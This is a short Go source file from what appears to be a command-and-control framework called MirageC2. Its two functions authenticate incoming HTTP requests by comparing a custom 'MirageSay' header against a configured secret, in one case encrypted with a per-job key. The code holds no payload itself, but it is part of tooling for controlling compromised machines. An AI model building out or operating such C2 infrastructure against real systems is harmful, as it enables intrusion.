package check

import (
	"MirageC2_V1.0/app/exchange"
	"MirageC2_V1.0/public/common"
	"encoding/base64"
	"net/http"
)

func MirageCheck(w http.ResponseWriter, r *http.Request) bool {
	if r.Header.Get("MirageSay") != common.MConfig.BannerAuth {
		http.Error(w, "[*] Missing or incorrect somethings", http.StatusBadRequest)
		return false
	}
	return true
}

func CryptoMirageCheck(w http.ResponseWriter, r *http.Request, id int) bool {
	authcheck := base64.StdEncoding.EncodeToString(exchange.CommandCrypto(common.MConfig.BannerAuth, common.Jobs[id-1].Key))
	if r.Header.Get("MirageSay") != authcheck {
		http.Error(w, "[*] Missing or incorrect somethings", http.StatusBadRequest)
		return false
	}
	return true
}
